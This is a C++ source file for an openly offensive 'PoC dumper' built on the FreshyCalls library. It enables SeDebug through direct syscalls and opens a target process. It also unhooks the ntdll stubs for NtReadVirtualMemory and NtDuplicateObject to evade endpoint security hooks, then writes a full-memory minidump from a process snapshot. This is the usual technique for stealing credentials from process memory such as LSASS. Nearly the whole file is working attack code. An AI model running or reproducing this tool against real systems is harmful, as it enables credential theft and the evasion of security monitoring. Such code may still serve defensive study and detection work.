#include "dumper.hpp"

auto freshycalls = FreshycallsClass();

void usage() {
  std::cerr << "FreshyCalls' PoC dumper usage: " << std::endl << std::endl;
  std::cerr << "\tdumper.exe -pid <process_id> <output_file>" << std::endl << std::endl;
}


void active_sedebug() {
  HANDLE h_token;
  TOKEN_PRIVILEGES token_privs;

  freshycalls.caller<NTSTATUS>("NtOpenProcessToken", HANDLE(-1), TOKEN_ADJUST_PRIVILEGES, &h_token).
      throw_if_unexpected(NTSTATUS(0),
                          "[active_sedebug] Something happened opening the current process token:: 0x{{result_as_hex}}");

  token_privs.PrivilegeCount = 1;
  // SeDebug's LUID low part == 20
  token_privs.Privileges[0].Luid = {20L, 0};
  token_privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  freshycalls.caller<NTSTATUS>("NtAdjustPrivilegesToken", h_token, false, &token_privs,
                               sizeof(TOKEN_PRIVILEGES), nullptr, nullptr).
      throw_if_unexpected(NTSTATUS(0),
                          "[active_sedebug] Something happened activating SeDebug: 0x{{result_as_hex}}");

  CloseHandle(h_token);
}


HANDLE open_process(DWORD process_id) {
  HANDLE h_process;
  OBJECT_ATTRIBUTES obj;

  InitializeObjectAttributes(&obj, nullptr, 0, nullptr, nullptr);
  CLIENT_ID client = {reinterpret_cast<HANDLE>(static_cast<DWORD_PTR>(process_id)), nullptr};

  freshycalls.caller<NTSTATUS>("NtOpenProcess", &h_process,
                               PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION
                                     | PROCESS_VM_READ | PROCESS_DUP_HANDLE,
                               &obj, &client).
      throw_if_unexpected(NTSTATUS(0),
                          "[open_process] Something happened opening the process: 0x{{result_as_hex}}");

  return h_process;
}


HANDLE create_dump_file(const std::string& path) {
  HANDLE h_dump_file;
  IO_STATUS_BLOCK isb;
  OBJECT_ATTRIBUTES obj;

  auto ntpath = freshycalls.string_to_ntpath(path);

  InitializeObjectAttributes(&obj, &ntpath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

  // for some reason we can't use `masked_syscall_stub` here or an ACCESS_VIOLATION will be throw
  freshycalls.direct_caller<NTSTATUS>("NtCreateFile", &h_dump_file, FILE_GENERIC_WRITE, &obj, &isb, 0,
                               FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
                               FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
                               0, 0).
      throw_if_unexpected(NTSTATUS(0),
                          "[create_dump_file] Something happened creating the dump file:  0x{{result_as_hex}}");

  return h_dump_file;
}


BOOL CALLBACK MiniDumpWriteDumpCallback(PVOID CallbackParam,
                                        PMINIDUMP_CALLBACK_INPUT CallbackInput,
                                        PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
  switch (CallbackInput->CallbackType) {
    case 16: // IsProcessSnapshotCallback
      CallbackOutput->Status = S_FALSE;
      break;
  }
  return TRUE;
}


int main(int argc, char *argv[]) {
  DWORD process_id;

  try {

    if (argc < 4) {
      usage();
      exit(-1);
    }

    if (std::string(argv[1]) == "-pid") {
      process_id = std::stoul(argv[2], nullptr, 10);
    } else {
      usage();
      exit(-1);
    }

    std::cout << "FreshyCalls' PoC dumper" << std::endl << std::endl;

    std::cout << "[+] Trying to activate SeDebug...";
    active_sedebug();
    std::cout << " OK!" << std::endl;

    std::cout << "[+] Trying to open the process...";
    const auto h_process = open_process(process_id);
    std::cout << " OK!" << std::endl;

    std::cout << "[+] Trying to create the dump file...";
    const auto h_dump_file = create_dump_file(argv[3]);
    std::cout << " OK!" << std::endl;

    std::cout << "[+] Trying to unhook NtReadVirtualMemory stub...";
    const std::vector<unsigned char> readvirtual_original_mem = freshycalls.unhook_stub("NtReadVirtualMemory");
    std::cout << " OK!" << std::endl;

    std::cout << "[+] Trying to unhook NtDuplicateObject stub...";
    const std::vector<unsigned char> duplicateobj_original_mem = freshycalls.unhook_stub("NtDuplicateObject");
    std::cout << " OK!" << std::endl;

    const DWORD capture_flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_VA_SPACE;
    HANDLE h_snapshot;

    std::cout << "[+] Trying to make a snapshot of the process...";
    freshycalls
        .module_caller<DWORD>("kernel32.dll", "PssCaptureSnapshot", h_process, capture_flags, CONTEXT_ALL, &h_snapshot).
        throw_if_unexpected(0,
                            "Something happened creating a snapshot of the process: 0x{{result_as_hex}}");
    std::cout << " OK!" << std::endl;

    MINIDUMP_CALLBACK_INFORMATION callback_info = {&MiniDumpWriteDumpCallback, 0};

    std::cout << "[+] Trying to dump the snapshot of the process...";
    bool is_ok = MiniDumpWriteDump(h_snapshot, process_id, h_dump_file, MiniDumpWithFullMemory,
                                   nullptr,nullptr, &callback_info);

    if (is_ok) {
      std::cout << " OK!" << std::endl;
    } else {
      std::ostringstream error_msg_stream;
      error_msg_stream << "Something happened dumping the snapshot: " << GetLastError();
      throw std::runtime_error(error_msg_stream.str());
    }

    std::cout << "[+] Recovering NtReadVirtualMemory stub original mem...";
    freshycalls.patch_stub("NtReadVirtualMemory", readvirtual_original_mem);
    std::cout << " OK!" << std::endl;

    std::cout << "[+] Recovering NtDuplicateObject stub original mem...";
    freshycalls.patch_stub("NtDuplicateObject", duplicateobj_original_mem);
    std::cout << " OK!" << std::endl;

    std::cout << std::endl << "Dump at " << argv[3] << std::endl;
    std::cout << "Enjoy!" << std::endl;

    return 0;

  }
  catch (const std::runtime_error &e) {
    std::cout << std::endl << e.what() << std::endl;
    exit(-1);
  }
}
